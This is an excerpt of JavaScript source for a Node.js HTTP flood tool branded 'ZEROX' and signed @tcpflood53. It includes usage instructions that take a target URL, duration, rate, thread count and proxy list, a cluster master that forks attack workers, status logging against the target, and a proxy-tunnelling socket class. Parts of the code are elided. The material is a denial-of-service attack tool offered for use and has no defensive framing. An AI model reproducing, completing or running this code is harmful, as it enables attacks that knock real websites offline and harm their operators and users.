...
Usage: node c-may.js target duration rate threads proxyfile
Exemple: node c-may.js https://exemple.com 120 32 8 proxy.txt

Made with ❤️‍🔥 by @tcpflood53
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [ZEROX]  title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timeout | @tcpflood53') {
        console.log(`${getCurrentTime()} [ZEROX] Request timeout`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [ZEROX]  title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [ZEROX]  ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  ...
  console.log(`
ZEROX Flood Started
Press Ctrl + Z to kill the attack
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [ZEROX] New worker:  ${i} | @tcpflood53`);
  }
  console.log(`${getCurrentTime()} [ZEROX] Attack started! `);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [ZEROX] Attack ended `);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
     ...
     connection.on("data", chunk => {
         ...
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "Error : Invalid response from proxy server | @tcpflood53");
         }
     ...
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "Error: Request Timeout | @tcpflood53");
     });
